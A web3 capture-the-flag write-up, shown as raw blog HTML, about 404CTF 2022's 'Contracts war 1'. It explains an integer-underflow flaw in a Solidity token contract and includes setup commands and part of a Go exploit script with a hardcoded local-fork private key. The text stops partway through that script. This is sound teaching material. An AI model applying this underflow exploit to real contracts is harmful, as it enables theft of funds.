<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Writeup 404CTF 2022 - Contracts war 1 (web3) - MevSec Blog</title><meta name=Description content="Writeup of web3 challenge of 404CTF 2022 - contracts war 1/2"><meta property="og:title" content="Writeup 404CTF 2022 - Contracts war 1 (web3)"><meta property="og:description" content="Writeup of web3 challenge of 404CTF 2022 - contracts war 1/2"><meta property="og:type" content="article"><meta property="og:url" content="/posts/writeup-404ctf-22/contractswar1/"><meta property="og:image" content="/posts/writeup-404ctf-22/contractswar1/war1.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-01-26T00:00:00+00:00"><meta property="article:modified_time" content="2023-01-26T00:00:00+00:00"><meta property="og:site_name" content="MevSec Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/posts/writeup-404ctf-22/contractswar1/war1.png"><meta name=twitter:title content="Writeup 404CTF 2022 - Contracts war 1 (web3)"><meta name=twitter:description content="Writeup of web3 challenge of 404CTF 2022 - contracts war 1/2"><meta name=application-name content="MevSec's blog"><meta name=apple-mobile-web-app-title content="MevSec's blog"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=/posts/writeup-404ctf-22/contractswar1/><link rel=prev href=/posts/writeup-404ctf-22/contractswar2/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Writeup 404CTF 2022 - Contracts war 1 (web3)","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"\/posts\/writeup-404ctf-22\/contractswar1\/"},"image":[{"@type":"ImageObject","url":"\/posts\/writeup-404ctf-22\/contractswar1\/war1.png","width":1703,"height":512}],"genre":"posts","keywords":"foundry, solidity, golang, web3, CTF, 404CTF","wordcount":1669,"url":"\/posts\/writeup-404ctf-22\/contractswar1\/","datePublished":"2023-01-26T00:00:00+00:00","dateModified":"2023-01-26T00:00:00+00:00","publisher":{"@type":"Organization","name":"Nodauf"},"author":{"@type":"Person","name":"Nodauf"},"description":"Writeup of web3 challenge of 404CTF 2022 - contracts war 1/2"}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":""==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:""==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="MevSec Blog">MevSec's blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/categories/>Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="MevSec Blog">MevSec's blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/categories/ title>Categories</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class="toc-content always-active" id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Writeup 404CTF 2022 - Contracts war 1 (web3)</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://twitter.com/Nodauf title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Nodauf</a></span>&nbsp;<span class=post-category>included in <a href=/categories/web3/><i class="far fa-folder fa-fw" aria-hidden=true></i>Web3</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-01-26>2023-01-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;1669 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;8 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#statement>Statement</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#first-condition>First condition</a></li><li><a href=#second-condition>Second condition</a></li></ul></li><li><a href=#recommendation>Recommendation</a></li></ul></nav></div></div><div class=content id=content><h2 id=statement>Statement</h2><p>The challenge statement is as follows:</p><blockquote><p>Agent, we discovered a smart contract from Hallebarde that allows you to get free money. It is also used to authenticate as a new member of Halberd. We want you to pretend to be one of their members. We recently found an endpoint that appears to be their login portal. Break into their system and retrieve any sensitive information you can find.</p><p>Contract at: 0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6</p><p>Ropsten test network</p><p>Author: Soremo</p><p>nc challenge.404ctf.fr 30885</p></blockquote><p>The source code of the smart contract is given:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=mi>0</span><span class=p>.</span><span class=mi>7</span><span class=p>.</span><span class=mi>6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>FreeMoney</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span> <span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=n>balances</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=n>lastWithdrawTime</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>bool</span><span class=p>)</span> <span class=n>isHallebardeMember</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=k>private</span> <span class=n>boss</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>boss</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>getMoney</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>numTokens</span> <span class=o>&lt;</span> <span class=mi>10000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>&gt;=</span> <span class=n>lastWithdrawTime</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+</span> <span class=mi>365</span> <span class=kc>days</span><span class=p>,</span> <span class=s>&#34;Vous devez attendre un an entre chaque demande d&#39;argent.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+=</span> <span class=n>numTokens</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>lastWithdrawTime</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>reset</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>lastWithdrawTime</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transfer</span><span class=p>(</span><span class=kt>address</span> <span class=n>receiver</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>public</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>-=</span> <span class=n>numTokens</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>balances</span><span class=p>[</span><span class=n>receiver</span><span class=p>]</span> <span class=o>+=</span> <span class=n>numTokens</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>enterHallebarde</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>100</span> <span class=kc>ether</span> <span class=o>||</span> <span class=n>boss</span> <span class=o>==</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=s>&#34;Vous n&#39;avez pas assez d&#39;argent pour devenir membre de Hallebarde.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>!=</span> <span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span> <span class=o>||</span> <span class=n>boss</span> <span class=o>==</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=s>&#34;Soyez plus entreprenant !&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=o>!</span><span class=n>isHallebardeMember</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=n>isHallebardeMember</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>getMembershipStatus</span><span class=p>(</span><span class=kt>address</span> <span class=n>memberAddress</span><span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>memberAddress</span> <span class=o>||</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>boss</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>isHallebardeMember</span><span class=p>[</span><span class=n>memberAddress</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=exploitation>Exploitation</h2><p>The goal of the challenge is to execute the <code>enterHallebarde()</code> function without having the transaction being reverted and connect to <code>challenge.404ctf.fr</code> on port 30885 to give our address to get the flag.</p><p>There are two checks to pass in the <code>enterHallebarde()</code> function to succeed:</p><ol><li>The sender&rsquo;s balance must be greater than 100 ether or the sender is the owner of the contract.</li><li>The sender must be different from the origin of the transaction or the sender must be the owner of the contract.</li></ol><h3 id=first-condition>First condition</h3><p>There are two functions that can increase the balance: <code>getMoney()</code> and <code>transfer()</code>.</p><p>With <code>getMoney()</code> you can get only 10000 wei which corresponds to 0.00000000000001 ether (<a href=https://coinguides.org/ethereum-unit-converter-gwei-ether/ target=_blank rel="noopener noreffer">check with a converter online</a>). This function can be called only once a year.</p><p>The <code>transfer()</code> function can be called to transfer money from the sender to another address. A first check is made to ensure that the sender has more than 0 ether. Then the <strong>sender</strong>&rsquo;s balance is <strong>decreased</strong> by the amount of money to be transferred. The <strong>recipient</strong>&rsquo;s balance is <strong>increased</strong> by the amount of money to be transferred. However, the balance is <strong>not compared</strong> to the <strong>number of tokens to be transferred</strong>.</p><blockquote><p>In the situation where the sender have 1 wei and wants to transfer 2 wei to a random address, what will happen to our uint256 variable?</p></blockquote><p>This is an integer <strong>underflow</strong> vulnerability. Our balance will be egal to the <strong>maximum value of an uint256</strong> which is about <strong>1.15e+59 ether</strong>.</p><p>Let&rsquo;s do it!</p><p>The environment has to be configured, the <a href=https://github.com/ethereum/solc-bin/blob/gh-pages/linux-amd64/solc-linux-amd64-v0.7.6%2Bcommit.7338295f target=_blank rel="noopener noreffer">solc</a> binary (version 0.7.6 to match the contract requirements) and <a href=https://geth.ethereum.org/downloads/ target=_blank rel="noopener noreffer">abigen</a> are needed.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir -p /tmp/challenge/FreeMoney
</span></span><span class=line><span class=cl><span class=nb>cd</span> <span class=nv>$_</span>
</span></span><span class=line><span class=cl>go mod init challenge
</span></span><span class=line><span class=cl>cp /tmp/FreeMoney.sol /tmp/challenge/FreeMoney/
</span></span><span class=line><span class=cl>solc --abi FreeMoney.sol -o .
</span></span><span class=line><span class=cl>abigen --abi<span class=o>=</span>./FreeMoney.abi --pkg<span class=o>=</span>freemoney --out<span class=o>=</span>FreeMoney.go
</span></span></code></pre></td></tr></table></div></div><p>An optional but recommended step is to work on a fork of the blockchain for faster performance and easier debugging.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>npx hardhat node --fork https://ropsten.infura.io/v3/&lt;APIKEY&gt;
</span></span><span class=line><span class=cl><span class=c1>#or</span>
</span></span><span class=line><span class=cl>anvil --fork-url https://ropsten.infura.io/v3/&lt;APIKEY&gt;
</span></span></code></pre></td></tr></table></div></div><p>And <strong>ctf-freemoney.go</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;context&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;crypto/ecdsa&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nx>freemoney</span> <span class=s>&#34;challenge/FreeMoney&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;flag&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;log&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;math/big&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/ethereum/go-ethereum/accounts/abi/bind&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/ethereum/go-ethereum/common&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/ethereum/go-ethereum/crypto&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/ethereum/go-ethereum/ethclient&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>fork</span> <span class=kt>bool</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>blockchainURL</span><span class=p>,</span> <span class=nx>contractAddress</span><span class=p>,</span> <span class=nx>privateKey</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>	<span class=nx>_</span> <span class=p>=</span> <span class=nx>privateKey</span>
</span></span><span class=line><span class=cl>	<span class=nx>flag</span><span class=p>.</span><span class=nf>BoolVar</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>fork</span><span class=p>,</span> <span class=s>&#34;fork&#34;</span><span class=p>,</span> <span class=kc>true</span><span class=p>,</span> <span class=s>&#34;Should we use the parameter for the fork blockchain ? (default: true)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>flag</span><span class=p>.</span><span class=nf>Parse</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=nx>contractAddress</span> <span class=p>=</span> <span class=s>&#34;0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6&#34;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>fork</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>blockchainURL</span> <span class=p>=</span> <span class=s>&#34;http://127.0.0.1:8545&#34;</span>
</span></span><span class=line><span class=cl>		<span class=nx>privateKey</span> <span class=p>=</span> <span class=s>&#34;59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>blockchainURL</span> <span class=p>=</span> <span class=s>&#34;https://eth-rinkeby.alchemyapi.io/v2/&lt;API-KEY&gt;&#34;</span>
</span></span><span class=line><span class=cl>		<span class=nx>privateKey</span> <span class=p>=</span> <span class=s>&#34;&lt;PRIVATE-KEY&gt;&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Connect to an ethereum node
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>client</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>ethclient</span><span class=p>.</span><span class=nf>Dial</span><span class=p>(</span><span class=nx>blockchainURL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Contract
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>contractAddressHash</span> <span class=o>:=</span> <span class=nx>common</span><span class=p>.</span><span class=nf>HexToAddress</span><span class=p>(</span><span class=nx>contractAddress</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>instance</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>freemoney</span><span class=p>.</span><span class=nf>NewFreemoney</span><span class=p>(</span><span class=nx>contractAddressHash</span><span class=p>,</span> <span class=nx>client</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Get 1 wei
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// GetMoney is a write transaction and therefore need to be signed
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>auth</span> <span class=o>:=</span> <span class=nf>newTransactor</span><span class=p>(</span><span class=nx>client</span><span class=p>,</span> <span class=nx>privateKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>instance</span><span class=p>.</span><span class=nf>GetMoney</span><span class=p>(</span><span class=nx>auth</span><span class=p>,</span> <span class=nx>big</span><span class=p>.</span><span class=nf>NewInt</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=s>&#34;fail to get money &#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Transfer 2 wei to a random address
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// Transfer is a write transaction and therefore need to be signed
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>auth</span> <span class=p>=</span> <span class=nf>newTransactor</span><span class=p>(</span><span class=nx>client</span><span class=p>,</span> <span class=nx>privateKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>instance</span><span class=p>.</span><span class=nf>Transfer</span><span class=p>(</span><span class=nx>auth</span><span class=p>,</span> <span class=nx>common</span><span class=p>.</span><span class=nf>HexToAddress</span><span class=p>(</span><span class=s>&#34;0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266&#34;</span><span class=p>),</span> <span class=nx>big</span><span class=p>.</span><span class=nf>NewInt</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=s>&#34;fail to get transfer &#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// EnterHallebarde
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// EnterHallebarde is a write transaction and therefore need to be signed
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>auth</span> <span class=p>=</span> <span class=nf>newTransactor</span><span class=p>(</span><span class=nx>client</span><span class=p>,</span> <span class=nx>privateKey</span><span class=p>)</span>
